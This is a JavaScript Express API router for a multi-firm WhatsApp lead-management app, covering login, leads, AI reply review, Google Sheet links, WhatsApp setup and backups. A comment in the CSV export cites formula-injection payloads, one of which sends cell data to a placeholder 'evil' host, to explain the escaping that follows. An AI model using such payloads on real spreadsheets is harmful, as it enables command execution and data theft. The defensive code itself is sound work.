// JSON API for the team UI.
import express from 'express';
import { all, get, run, kvGet, parseJson } from '../db.js';
import { config, configSummary } from '../config.js';
import { getSettings, setSettings, getSetting, firmDefaults, getJourney } from '../settings.js';
import { DEFAULT_FIRM_ID, currentFirmId, inFirm, getFirm, listFirms, updateFirm, publicFirm, isDefaultFirm, firmPhoneNumberId, firmWabaId } from '../firms.js';
import { addFirm } from '../services/firm-setup.js';
import * as auth from '../services/auth.js';
import * as leads from '../services/leads.js';
import * as conv from '../services/conversation.js';
import * as wa from '../services/whatsapp.js';
import { testAi } from '../services/ai.js';
import { addClient } from '../services/events.js';
import { importFromSheet, processSheetQueue, sheetStatus } from '../services/sync.js';
import { getSheetProvider, resetSheetProvider } from '../services/sheets/index.js';
import { activeSheetConfig, sheetConnectionPublic, setSheetConnection, clearSheetConnection, parseSheetRef } from '../services/sheets/active.js';
import { runFollowups, followupStatus, runTickNow } from '../services/scheduler.js';
import { requireAuth, requireRole, requireWriter, csrfGuard, setSessionCookie, clearSessionCookie } from '../middleware/auth.js';
import { healthReport } from '../services/monitor.js';
import { runBackup, listBackups, backupStatus } from '../services/backup.js';
import { spendSnapshot } from '../services/guard.js';
import { aiQueueStats } from '../services/ai.js';
import fsSync from 'node:fs';
import pathMod from 'node:path';
import { normalizePhone, firstName } from '../util/normalize.js';

export const apiRouter = express.Router();
apiRouter.use(express.json({ limit: '1mb' }));
apiRouter.use(csrfGuard);
// Which firm a request is for: the X-Firm-Id header the UI sends (?firm= on plain links such as the CSV export),
// default firm 1. Requests about one lead act for that lead's firm whatever the header says.
apiRouter.use((req, res, next) => {
  const firm = getFirm(Number(req.get('x-firm-id') || req.query.firm) || DEFAULT_FIRM_ID) || getFirm(DEFAULT_FIRM_ID);
  inFirm(firm.id, next);
});

const wrap = (fn) => (req, res, next) => Promise.resolve(fn(req, res, next)).catch(next);
const isSecure = (req) => req.secure || req.get('x-forwarded-proto') === 'https';

// ---------- session ----------
apiRouter.get('/bootstrap', (req, res) => {
  res.json({ needsSetup: auth.userCount() === 0, user: auth.publicUser(req.user), app_name: getSetting('app_name'), company_name: getSetting('company_name'), publicUrl: config.publicUrl, brain: config.brain,
    firms: req.user ? listFirms({ activeOnly: true }).map(publicFirm) : [] });
});
apiRouter.post('/setup', wrap((req, res) => {
  if (auth.userCount() > 0) return res.status(403).json({ error: 'Setup already completed' });
  const user = auth.createUser({ ...req.body, role: 'admin' });
  const s = auth.login(user.email, req.body.password, { ip: req.ip, userAgent: req.get('user-agent') });
  setSessionCookie(res, s.sessionId, isSecure(req));
  res.json({ user: s.user });
}));
apiRouter.post('/login', wrap((req, res) => {
  if (!auth.loginAllowed(req.ip)) return res.status(429).json({ error: 'Too many attempts — wait a minute and try again' });
  auth.noteLoginAttempt(req.ip);
  const s = auth.login(req.body.email, req.body.password, { ip: req.ip, userAgent: req.get('user-agent') });
  if (!s) return res.status(401).json({ error: 'Incorrect email or password' });
  setSessionCookie(res, s.sessionId, isSecure(req));
  res.json({ user: s.user });
}));
apiRouter.post('/logout', (req, res) => { auth.logout(req.sessionId); clearSessionCookie(res); res.json({ ok: true }); });
apiRouter.get('/me', requireAuth, (req, res) => res.json({ user: auth.publicUser(req.user) }));
apiRouter.post('/me/password', requireAuth, wrap((req, res) => {
  if (!auth.verifyPassword(req.body.current || '', req.user.password_hash)) return res.status(400).json({ error: 'Current password is incorrect' });
  auth.updateUser(req.user.id, { password: req.body.password });
  res.json({ ok: true });
}));

// ---------- live events ----------
apiRouter.get('/events', requireAuth, (req, res) => { addClient(res, req.user); });

// ---------- dashboard ----------
apiRouter.get('/stats', requireAuth, (req, res) => {
  const firm = currentFirmId();
  const s = leads.stats(firm);
  const attention = {
    humanUnread: leads.listLeads({ firm, mode: 'human', limit: 10, sort: 'last_message_at' }).rows.filter(l => l.unread_count > 0),
    unassignedProspects: leads.listLeads({ firm, status: 'PROSPECT', assigned: 'none', limit: 10 }).rows,
    failed: all(`SELECT m.*, l.full_name, l.wa_number FROM messages m JOIN leads l ON l.id = m.lead_id WHERE l.firm_id = ? AND m.status = 'failed' ORDER BY m.id DESC LIMIT 10`, firm).map(leads.serializeMessage),
  };
  const recentAi = all(`SELECT m.*, l.full_name, l.wa_number, l.mode FROM messages m JOIN leads l ON l.id = m.lead_id WHERE l.firm_id = ? AND m.sender = 'ai' ORDER BY m.id DESC LIMIT 8`, firm).map(leads.serializeMessage);
  const activity = all(`SELECT a.*, l.full_name, l.wa_number, u.name AS user_name FROM audit a LEFT JOIN leads l ON l.id = a.lead_id LEFT JOIN users u ON u.id = a.user_id WHERE a.firm_id = ? ORDER BY a.id DESC LIMIT 25`, firm).map(a => ({ ...a, data: parseJson(a.data) }));
  res.json({ stats: s, attention, recentAi, activity, sheet: sheetStatus(), followups: followupStatus(), webhook: { verifiedAt: kvGet('webhook.verifiedAt'), lastEventAt: kvGet('webhook.lastEventAt') } });
});

// ---------- leads ----------
apiRouter.get('/leads', requireAuth, (req, res) => {
  const { status, mode, assigned, q, qualified, limit, offset, sort } = req.query;
  res.json(leads.listLeads({ firm: currentFirmId(), status, mode, assigned: assigned === 'me' ? String(req.user.id) : assigned, q, qualified, limit: Math.min(Number(limit) || 200, 1000), offset: Number(offset) || 0, sort }));
});
apiRouter.post('/leads', requireWriter, wrap((req, res) => {
  const lead = leads.createLead({ wa_number: req.body.wa_number, full_name: req.body.full_name, email: req.body.email, source: 'manual', fields: req.body.fields || {} });
  res.json({ lead: leads.serializeLead(lead) });
}));
apiRouter.get('/leads/:id', requireAuth, (req, res) => {
  const lead = leads.getLead(Number(req.params.id));
  if (!lead) return res.status(404).json({ error: 'Lead not found' });
  const messages = all('SELECT * FROM messages WHERE lead_id = ? ORDER BY id ASC LIMIT 500', lead.id).map(leads.serializeMessage);
  const history = all('SELECT a.*, u.name AS user_name FROM audit a LEFT JOIN users u ON u.id = a.user_id WHERE a.lead_id = ? ORDER BY a.id DESC LIMIT 40', lead.id).map(a => ({ ...a, data: parseJson(a.data) }));
  res.json({ lead: leads.serializeLead(lead), messages, history, templates: templateOptions(lead) });
});
const templateOptions = (lead) => conv.templateChoices(lead);
apiRouter.patch('/leads/:id', requireWriter, wrap((req, res) => {
  const lead = leads.getLead(Number(req.params.id));
  if (!lead) return res.status(404).json({ error: 'Lead not found' });
  const patch = {};
  for (const k of ['full_name', 'email', 'notes', 'corridor', 'budget', 'timeline', 'configuration', 'funding', 'objective', 'outreach_paused']) if (k in req.body) patch[k] = req.body[k];
  if ('full_name' in patch) patch.first_name = firstName(patch.full_name);
  let updated = leads.updateLead(lead.id, patch, { userId: req.user.id });
  if (req.body.status && req.body.status !== lead.status) updated = leads.setStatus(updated, req.body.status, { userId: req.user.id, reason: 'manual' });
  leads.audit('lead.edit', { leadId: lead.id, userId: req.user.id, data: { fields: Object.keys(patch) } });
  res.json({ lead: leads.serializeLead(updated) });
}));
apiRouter.post('/leads/:id/read', requireAuth, (req, res) => { leads.markLeadRead(Number(req.params.id)); res.json({ ok: true }); });
apiRouter.post('/leads/:id/takeover', requireWriter, wrap((req, res) => {
  const lead = leads.getLead(Number(req.params.id)); if (!lead) return res.status(404).json({ error: 'Lead not found' });
  res.json({ lead: leads.serializeLead(leads.takeOver(lead, req.user.id)) });
}));
apiRouter.post('/leads/:id/handback', requireWriter, wrap((req, res) => {
  const lead = leads.getLead(Number(req.params.id)); if (!lead) return res.status(404).json({ error: 'Lead not found' });
  res.json({ lead: leads.serializeLead(leads.handBackToAi(lead, req.user.id)) });
}));
apiRouter.post('/leads/:id/assign', requireWriter, wrap((req, res) => {
  const lead = leads.getLead(Number(req.params.id)); if (!lead) return res.status(404).json({ error: 'Lead not found' });
  const assignee = req.body.user_id ? Number(req.body.user_id) : null;
  if (assignee && !auth.getUserById(assignee)) return res.status(400).json({ error: 'Unknown user' });
  res.json({ lead: leads.serializeLead(leads.assignLead(lead, assignee, req.user.id)) });
}));
apiRouter.post('/leads/:id/status', requireWriter, wrap((req, res) => {
  const lead = leads.getLead(Number(req.params.id)); if (!lead) return res.status(404).json({ error: 'Lead not found' });
  res.json({ lead: leads.serializeLead(leads.setStatus(lead, req.body.status, { userId: req.user.id, reason: req.body.reason || 'manual' })) });
}));
apiRouter.post('/leads/:id/messages', requireWriter, wrap(async (req, res) => {
  const msg = await conv.humanReply(Number(req.params.id), req.user.id, req.body.text);
  res.json({ message: leads.serializeMessage(msg), lead: leads.serializeLead(leads.getLead(Number(req.params.id))) });
}));
apiRouter.post('/leads/:id/template', requireWriter, wrap(async (req, res) => {
  const msg = await conv.humanTemplate(Number(req.params.id), req.user.id, req.body.key);
  res.json({ message: leads.serializeMessage(msg), lead: leads.serializeLead(leads.getLead(Number(req.params.id))) });
}));
apiRouter.post('/leads/bulk', requireWriter, wrap((req, res) => {
  const ids = (req.body.ids || []).map(Number).filter(Boolean);
  const action = req.body.action;
  let n = 0;
  for (const id of ids) {
    const lead = leads.getLead(id); if (!lead) continue;
    if (action === 'pause') leads.updateLead(id, { outreach_paused: 1 });
    else if (action === 'resume') leads.updateLead(id, { outreach_paused: 0 });
    else if (action === 'takeover') leads.takeOver(lead, req.user.id);
    else if (action === 'handback') leads.handBackToAi(lead, req.user.id);
    else if (action === 'assign') leads.assignLead(lead, req.body.user_id ? Number(req.body.user_id) : null, req.user.id);
    else if (action === 'status') leads.setStatus(lead, req.body.status, { userId: req.user.id, reason: 'bulk' });
    else continue;
    n++;
  }
  leads.audit('lead.bulk', { userId: req.user.id, data: { action, count: n } });
  res.json({ ok: true, count: n });
}));
apiRouter.get('/export/leads.csv', requireAuth, (req, res) => {
  const rows = leads.listLeads({ firm: currentFirmId(), limit: 100000 }).rows;
  const cols = ['id', 'full_name', 'wa_number', 'email', 'status', 'mode', 'assigned_to', 'qualified', 'corridor', 'budget', 'timeline', 'configuration', 'funding', 'objective', 'source', 'sheet_row', 'last_inbound_at', 'last_outbound_at', 'last_message_preview', 'created_at'];
  // Spreadsheet formula injection: a lead controls their own WhatsApp profile name, so a name like
  // =cmd|'/c calc'!A1 or =HYPERLINK("http://evil/"&A1) would execute the moment a salesperson opens
  // this export in Excel. Neutralise anything that could start a formula by prefixing an apostrophe.
  // Plain phone numbers (+919...) and negative numbers are left alone — they carry no function call.
  const looksLikeFormula = (s) => /^[=@]/.test(s) || (/^[+\-\t\r]/.test(s) && /[A-Za-z|!(]/.test(s));
  const esc = (v) => { const s = String(v ?? ''); return `"${(looksLikeFormula(s) ? "'" + s : s).replace(/"/g, '""')}"`; };
  res.setHeader('Content-Type', 'text/csv; charset=utf-8'); res.setHeader('Content-Disposition', 'attachment; filename="leads.csv"');
  // BOM so Excel reads Indian names and rupee symbols as UTF-8 rather than mojibake.
  res.send('\uFEFF' + [cols.join(','), ...rows.map(r => cols.map(c => esc(r[c])).join(','))].join('\r\n'));
});

// ---------- AI review ----------
apiRouter.get('/review', requireAuth, (req, res) => {
  const filter = req.query.filter || 'unreviewed';
  const where = { unreviewed: "m.review IS NULL", flagged: "m.review = 'bad'", good: "m.review = 'good'", all: '1=1' }[filter] || '1=1';
  const limit = Math.min(Number(req.query.limit) || 50, 200);
  const firm = currentFirmId();
  const rows = all(`SELECT m.*, l.full_name, l.wa_number, l.mode, l.status AS lead_status, u.name AS reviewer_name,
      (SELECT body FROM messages i WHERE i.id = m.in_reply_to) AS inbound_body
      FROM messages m JOIN leads l ON l.id = m.lead_id LEFT JOIN users u ON u.id = m.reviewed_by
      WHERE l.firm_id = ? AND m.sender = 'ai' AND ${where} ORDER BY m.id DESC LIMIT ?`, firm, limit).map(leads.serializeMessage);
  const count = (cond) => get(`SELECT COUNT(*) n FROM messages m JOIN leads l ON l.id = m.lead_id WHERE l.firm_id = ? AND m.sender='ai' AND ${cond}`, firm).n;
  const counts = { unreviewed: count('m.review IS NULL'), flagged: count("m.review='bad'"), good: count("m.review='good'"), all: count('1=1') };
  res.json({ rows, counts });
});
apiRouter.post('/messages/:id/review', requireWriter, wrap((req, res) => {
  const m = get('SELECT * FROM messages WHERE id = ?', Number(req.params.id));
  if (!m) return res.status(404).json({ error: 'Message not found' });
  const review = ['good', 'bad'].includes(req.body.review) ? req.body.review : null;
  run('UPDATE messages SET review = ?, review_note = ?, reviewed_by = ?, reviewed_at = ? WHERE id = ?', review, req.body.note || null, review ? req.user.id : null, review ? new Date().toISOString() : null, m.id);
  leads.audit('ai.review', { leadId: m.lead_id, userId: req.user.id, data: { message_id: m.id, review, note: req.body.note || '' } });
  res.json({ message: leads.serializeMessage(get('SELECT * FROM messages WHERE id = ?', m.id)) });
}));

// ---------- team ----------
apiRouter.get('/users', requireAuth, (req, res) => res.json({ users: auth.listUsers() }));
apiRouter.post('/users', requireRole('admin'), wrap((req, res) => res.json({ user: auth.publicUser(auth.createUser(req.body)) })));
apiRouter.patch('/users/:id', requireRole('admin'), wrap((req, res) => {
  const id = Number(req.params.id);
  if (id === req.user.id && req.body.active === false) return res.status(400).json({ error: 'You cannot deactivate yourself' });
  if (id === req.user.id && req.body.role && req.body.role !== 'admin') return res.status(400).json({ error: 'You cannot remove your own admin role' });
  res.json({ user: auth.publicUser(auth.updateUser(id, req.body)) });
}));

// ---------- settings & system ----------
apiRouter.get('/settings', requireAuth, (req, res) => res.json({ settings: getSettings(), defaults: firmDefaults(), config: configSummary(), firm: publicFirm(currentFirmId()), readOnly: req.user.role !== 'admin' }));
apiRouter.put('/settings', requireRole('admin'), wrap((req, res) => {
  const before = getSettings();
  const after = setSettings(req.body || {});
  const changed = Object.keys(after).filter(k => JSON.stringify(after[k]) !== JSON.stringify(before[k]));
  leads.audit('settings.update', { userId: req.user.id, data: { changed } });
  res.json({ settings: after, changed });
}));
apiRouter.get('/system', requireAuth, wrap(async (req, res) => {
  res.json({ config: configSummary(), sheet: sheetStatus(), followups: followupStatus(), webhook: { verifiedAt: kvGet('webhook.verifiedAt'), lastEventAt: kvGet('webhook.lastEventAt'), url: config.publicUrl ? `${config.publicUrl}/webhook` : '(set PUBLIC_URL)', verifyToken: config.whatsapp.verifyToken } });
}));
// ---- Sheet connection (set from Settings → Google Sheet, no redeploy needed) ----
apiRouter.get('/sheet/connection', requireRole('admin'), (req, res) => {
  res.json({ connection: sheetConnectionPublic(), status: sheetStatus() });
});
apiRouter.post('/sheet/connect', requireRole('admin'), wrap(async (req, res) => {
  const b = req.body || {};
  const method = b.method || 'link';                       // link | appsscript | serviceaccount
  const ref = parseSheetRef(b.sheetUrl || b.spreadsheetId || '');
  const spreadsheetId = ref.spreadsheetId || String(b.spreadsheetId || '').trim();
  const provider = method === 'appsscript' ? 'appsscript' : method === 'serviceaccount' ? 'serviceaccount'
    : method === 'memory' && config.sheets.provider === 'memory' ? 'memory' : 'publiclink'; // memory: the fake sheet of a test run
  if (provider === 'memory') { setSheetConnection({ provider }); resetSheetProvider(); return res.json({ ok: true, connection: sheetConnectionPublic(), import: await importFromSheet({ userId: req.user.id, force: true }) }); }
  if (!spreadsheetId && provider !== 'appsscript') return res.status(400).json({ error: 'Paste your Google Sheet link (or its id).' });
  const conn = {
    provider, spreadsheetId,
    gid: ref.gid || String(b.gid || '').trim(),
    leadsTab: String(b.leadsTab || '').trim(),
    repliesTab: String(b.repliesTab || 'Client Replies').trim(),
    appsScriptUrl: String(b.appsScriptUrl || '').trim(),
    appsScriptSecret: String(b.appsScriptSecret || '').trim(),
    serviceAccountB64: String(b.serviceAccountB64 || '').replace(/\s+/g, ''),
  };
  if (provider === 'appsscript' && !conn.appsScriptUrl) return res.status(400).json({ error: 'Paste the Apps Script Web app URL (it ends with /exec).' });
  // SSRF guard: the server fetches this URL, so pin it to Google's Apps Script hosts. Without this an
  // app admin could point it at an internal address (localhost, the Railway private network) and read
  // the response back through the connection test.
  if (provider === 'appsscript') {
    let u; try { u = new URL(conn.appsScriptUrl); } catch { return res.status(400).json({ error: 'That is not a valid URL.' }); }
    const hostOk = u.protocol === 'https:' && /(^|\.)(script\.google\.com|script\.googleusercontent\.com)$/.test(u.hostname);
    if (!hostOk) return res.status(400).json({ error: 'The Apps Script URL must be an https script.google.com address ending in /exec.' });
  }
  if (provider === 'serviceaccount' && !conn.serviceAccountB64) return res.status(400).json({ error: 'Paste the base64 of the service-account JSON key.' });
  setSheetConnection(conn);
  resetSheetProvider();
  let ping = null, imported = null, error = null;
  try { ping = await getSheetProvider().ping(); } catch (e) { error = e.message; }
  if (!error) { try { imported = await importFromSheet({ userId: req.user.id, force: true }); } catch (e) { error = e.message; } }
  leads.audit('sheet.connect', { userId: req.user.id, data: { provider, spreadsheetId, ok: !error } });
  res.json({ ok: !error, error, connection: sheetConnectionPublic(), ping, import: imported });
}));
apiRouter.post('/sheet/disconnect', requireRole('admin'), wrap((req, res) => {
  clearSheetConnection(); resetSheetProvider();
  leads.audit('sheet.disconnect', { userId: req.user.id });
  res.json({ ok: true, connection: sheetConnectionPublic() });
}));
apiRouter.post('/sheet/test', requireRole('admin'), wrap(async (req, res) => {
  const p = getSheetProvider(); if (!p) return res.status(400).json({ error: 'No sheet connected yet — connect one under Settings → Google Sheet.' });
  res.json({ result: await p.ping() });
}));
apiRouter.post('/sheet/import', requireRole('admin'), wrap(async (req, res) => { res.json({ result: await importFromSheet({ userId: req.user.id, force: true }) }); }));
apiRouter.post('/sheet/flush', requireRole('admin'), wrap(async (req, res) => { res.json({ result: await processSheetQueue(100) }); }));
apiRouter.post('/ai/test', requireRole('admin'), wrap(async (req, res) => { res.json({ result: await testAi() }); }));
apiRouter.post('/followups/run', requireRole('admin'), wrap(async (req, res) => { res.json({ result: await runFollowups() }); }));
apiRouter.post('/scheduler/tick', requireRole('admin'), wrap(async (req, res) => { await runTickNow(); res.json({ ok: true }); }));

// ---------- firms ----------
apiRouter.get('/firms', requireAuth, (req, res) => res.json({ firms: listFirms().map(publicFirm) }));
apiRouter.post('/firms', requireRole('admin'), wrap((req, res) => {
  const b = req.body || {};
  const firm = addFirm({ name: b.name, number: b.display_number || b.number || '', sheet: b.sheet_url || '', leads_tab: b.leads_tab || '' }, { userId: req.user.id });
  res.json({ firm: publicFirm(firm) });
}));
apiRouter.patch('/firms/:id', requireRole('admin'), wrap((req, res) => {
  const firm = getFirm(Number(req.params.id));
  if (!firm) return res.status(404).json({ error: 'Firm not found' });
  const patch = {};
  for (const k of ['name', 'display_number', 'phone_number_id', 'waba_id', 'active']) if (k in (req.body || {})) patch[k] = req.body[k];
  // Firm 1's sender is PHONE_NUMBER_ID: changing it here would silently move every live conversation.
  if (isDefaultFirm(firm.id) && ('phone_number_id' in patch || 'waba_id' in patch)) return res.status(400).json({ error: 'The main firm sends from PHONE_NUMBER_ID / WABA_ID — change those variables in Railway instead.' });
  const updated = updateFirm(firm.id, patch);
  leads.audit('firm.update', { userId: req.user.id, firmId: firm.id, data: { fields: Object.keys(patch) } });
  res.json({ firm: publicFirm(updated) });
}));

// ---------- WhatsApp setup panel (for the firm the request is for) ----------
const digitsOf = (v) => String(v || '').replace(/\D/g, '');
// A number the wizard registered for a firm other than firm 1 becomes that firm's sender straight away.
function linkNumber(firm, phoneNumberId) {
  if (!phoneNumberId || isDefaultFirm(firm.id) || firm.phone_number_id) return false;
  updateFirm(firm.id, { phone_number_id: String(phoneNumberId) });
  leads.audit('firm.number_linked', { firmId: firm.id, data: { phone_number_id: String(phoneNumberId) } });
  return true;
}
apiRouter.get('/wa/status', requireRole('admin'), wrap(async (req, res) => {
  const firm = getFirm(currentFirmId());
  const pid = firmPhoneNumberId(firm), waba = firmWabaId(firm);
  const out = { configured: wa.isConfigured() && !!(pid || config.whatsapp.mock), mock: config.whatsapp.mock, firm: publicFirm(firm) };
  const safe = async (k, fn) => { try { out[k] = await fn(); } catch (e) { out[k] = { error: e.message }; } };
  if (config.whatsapp.token || config.whatsapp.mock) {
    await safe('token', () => wa.tokenDebug());
    if (pid || (config.whatsapp.mock && isDefaultFirm(firm.id))) await safe('phone', () => wa.phoneInfo(pid || undefined));
    if (waba || config.whatsapp.mock) { await safe('numbers', () => wa.listPhoneNumbers(waba)); await safe('templates', () => wa.listTemplates(waba)); await safe('subscribedApps', () => wa.subscribedApps(waba)); }
    await safe('webhook', () => wa.webhookStatus());
  }
  // This firm's number is already on the WhatsApp Business Account but not linked yet → the UI offers to link it.
  if (!pid && firm.display_number && Array.isArray(out.numbers?.data)) out.match = out.numbers.data.find(n => digitsOf(n.display_phone_number) === digitsOf(firm.display_number)) || null;
  res.json(out);
}));
apiRouter.post('/wa/link-number', requireRole('admin'), wrap(async (req, res) => {
  const firm = getFirm(currentFirmId());
  if (isDefaultFirm(firm.id)) return res.status(400).json({ error: 'The main firm sends from PHONE_NUMBER_ID — change it in Railway.' });
  const updated = updateFirm(firm.id, { phone_number_id: String(req.body.phone_number_id || '') });
  leads.audit('firm.number_linked', { userId: req.user.id, firmId: firm.id, data: { phone_number_id: updated.phone_number_id } });
  res.json({ firm: publicFirm(updated) });
}));
apiRouter.post('/wa/add-number', requireRole('admin'), wrap(async (req, res) => {
  const firm = getFirm(currentFirmId());
  // 10-digit Indian number by default; the firm's own number and name when the form is left blank.
  const national = digitsOf(req.body.phone_number) || digitsOf(firm.display_number).replace(/^91(?=\d{10}$)/, '');
  const result = await wa.addPhoneNumber({ cc: req.body.cc || '91', phoneNumber: national, verifiedName: req.body.verified_name || firm.name, wabaId: firmWabaId(firm) });
  if (!firm.display_number && national) updateFirm(firm.id, { display_number: `+${req.body.cc || '91'}${national}` });
  const linked = linkNumber(getFirm(firm.id), result?.id);
  leads.audit('wa.number_added', { userId: req.user.id, firmId: firm.id, data: { number: national, id: result?.id, linked } });
  res.json({ result, linked, firm: publicFirm(firm.id) });
}));
apiRouter.post('/wa/request-code', requireRole('admin'), wrap(async (req, res) => res.json({ result: await wa.requestCode(req.body.phone_number_id || firmPhoneNumberId(currentFirmId()), { method: req.body.method || 'SMS', language: req.body.language || 'en' }) })));
apiRouter.post('/wa/verify-code', requireRole('admin'), wrap(async (req, res) => res.json({ result: await wa.verifyCode(req.body.phone_number_id || firmPhoneNumberId(currentFirmId()), req.body.code) })));
apiRouter.post('/wa/register', requireRole('admin'), wrap(async (req, res) => {
  const pin = String(req.body.pin || '');
  if (!/^\d{6}$/.test(pin)) return res.status(400).json({ error: 'PIN must be 6 digits' });
  const firm = getFirm(currentFirmId());
  const pid = req.body.phone_number_id || firmPhoneNumberId(firm);
  const result = await wa.registerNumber(pid, pin);
  const linked = linkNumber(firm, pid);
  leads.audit('wa.number_registered', { userId: req.user.id, firmId: firm.id, data: { phone_number_id: pid, linked } });
  res.json({ result, linked, firm: publicFirm(firm.id) });
}));
apiRouter.post('/wa/subscribe', requireRole('admin'), wrap(async (req, res) => res.json({ result: await wa.subscribeApp(firmWabaId(currentFirmId())) })));
apiRouter.post('/wa/configure-webhook', requireRole('admin'), wrap(async (req, res) => {
  if (!config.publicUrl) return res.status(400).json({ error: 'Set PUBLIC_URL first' });
  res.json({ result: await wa.configureWebhook(`${config.publicUrl}/webhook`) });
}));
apiRouter.post('/wa/submit-templates', requireRole('admin'), wrap(async (req, res) => {
  // Creates every journey template of this firm on its WABA (MARKETING, quick-reply buttons, {{1}} = first name). Existing names are skipped.
  const waba = firmWabaId(currentFirmId());
  const existing = new Set(((await wa.listTemplates(waba)).data || []).map(t => t.name));
  const language = getSetting('template_language') || 'en';
  const footer = getSetting('template_footer');
  const results = [];
  for (const step of getJourney()) {
    if (existing.has(step.template)) { results.push({ template: step.template, status: 'already exists' }); continue; }
    const components = [{ type: 'BODY', text: step.text, ...(step.text.includes('{{1}}') ? { example: { body_text: [['Hemant']] } } : {}) }];
    if (footer) components.push({ type: 'FOOTER', text: footer });
    if (step.buttons.length) components.push({ type: 'BUTTONS', buttons: step.buttons.map(b => ({ type: 'QUICK_REPLY', text: b })) });
    try { const r = await wa.createTemplate(waba, { name: step.template, language, category: 'MARKETING', allow_category_change: true, components }); results.push({ template: step.template, status: r.status || 'submitted', id: r.id }); }
    catch (e) { results.push({ template: step.template, status: 'error', error: e.message }); }
  }
  leads.audit('templates.submit', { userId: req.user.id, data: { results } });
  res.json({ results });
}));
apiRouter.post('/wa/send-test', requireRole('admin'), wrap(async (req, res) => {
  const to = normalizePhone(req.body.to); if (!to) return res.status(400).json({ error: 'Invalid number' });
  let lead = leads.getLeadByNumber(to) || leads.createLead({ wa_number: to, full_name: req.body.name || 'Test contact', source: 'manual' });
  let msg;
  if (req.body.template) msg = await conv.sendTemplateOut(lead, { name: req.body.template, bodyParams: getSetting('templates_use_name_param') ? [lead.first_name || 'there'] : [], sender: 'human', userId: req.user.id, bodyText: `Test template ${req.body.template}` });
  else msg = await conv.sendOut(lead, { text: req.body.text || `Test message from ${getSetting('company_name')} (LeadDesk)`, sender: 'human', userId: req.user.id });
  res.json({ message: leads.serializeMessage(msg), lead_id: lead.id });
}));
apiRouter.post('/wa/simulate-inbound', requireRole('admin'), wrap(async (req, res) => {
  // Local testing helper: pretend a lead sent us a message (only with WA_MOCK or in development).
  if (!config.whatsapp.mock && config.env === 'production') return res.status(403).json({ error: 'Only available in mock/development mode' });
  const from = (normalizePhone(req.body.from) || '').replace('+', '');
  if (!from) return res.status(400).json({ error: 'Invalid number' });
  const firm = getFirm(Number(req.body.firm_id) || currentFirmId());
  if (!firm) return res.status(400).json({ error: 'Unknown firm' });
  const n = conv.ingestWebhook({ object: 'whatsapp_business_account', entry: [{ changes: [{ value: { metadata: { phone_number_id: firmPhoneNumberId(firm) || 'MOCK' }, contacts: [{ wa_id: from, profile: { name: req.body.name || '' } }], messages: [{ from, id: 'wamid.SIM.' + Date.now() + Math.random().toString(36).slice(2, 6), timestamp: String(Math.floor(Date.now() / 1000)), type: 'text', text: { body: req.body.text || 'Hi' } }] } }] }] }, { firmId: firm.id });
  res.json({ ok: true, queued: n });
}));

apiRouter.use((err, req, res, next) => { // eslint-disable-line no-unused-vars
  const status = err.status || 400;
  res.status(status).json({ error: err.message || 'Request failed', details: err.details });
});


// ---- Ops: health, spend and backups (admin only) ----
apiRouter.get('/ops/health', requireRole('admin'), wrap(async (req, res) => {
  res.json(await healthReport({ probeToken: req.query.probe !== '0' }));
}));

apiRouter.get('/ops/spend', requireAuth, (req, res) => res.json({ spend: spendSnapshot(), aiQueue: aiQueueStats() }));

apiRouter.get('/ops/backups', requireRole('admin'), (req, res) => res.json({ status: backupStatus(), files: listBackups() }));

apiRouter.post('/ops/backups/run', requireRole('admin'), wrap(async (req, res) => {
  res.json(await runBackup({ reason: 'manual' }));
}));

// Download a snapshot so there is always a copy off the platform.
apiRouter.get('/ops/backups/:file', requireRole('admin'), (req, res) => {
  const file = pathMod.basename(String(req.params.file || ''));
  if (!/^leaddesk-[\w-]+\.db$/.test(file)) return res.status(400).json({ error: 'Bad file name' });
  const full = pathMod.join(config.backup.dir, file);
  if (!fsSync.existsSync(full)) return res.status(404).json({ error: 'Not found' });
  res.setHeader('Content-Type', 'application/octet-stream');
  res.setHeader('Content-Disposition', `attachment; filename="${file}"`);
  fsSync.createReadStream(full).pipe(res);
});
